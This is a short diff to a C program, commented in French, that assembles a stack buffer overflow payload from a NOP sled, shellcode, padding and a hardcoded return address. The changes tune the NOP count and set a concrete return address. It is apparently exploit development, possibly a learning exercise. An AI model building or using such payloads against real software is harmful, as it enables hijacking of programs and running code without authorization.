@@ -24,7 +24,7 @@ __asm__("movq %rsp,%rax");
 char* crafted_payload(){
 
 	// Serie de NOP
-	int nb_nop = 10;
+	int nb_nop = 11;
 	char *nops = malloc(nb_nop * sizeof(char));
 	for (int i = 0; i < nb_nop; i++){
 		//nops[i] = "\x90";
@@ -45,7 +45,7 @@ char* crafted_payload(){
 	// Adresse de retour en dur
 	//char retour[] = "\x01\x40\x73\x74\x88\x34\x60\xb2";
 	//char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
-	char retour[] = "\x41";
+	char retour[] = "\x8f\x54\x55\x55\x55\x55";
 	//printf("%s\n", retour);
 
 	char *final_buf = malloc((strlen(nops) + strlen(shellcode) + strlen(padding_bp) + strlen(retour)) * sizeof(char));
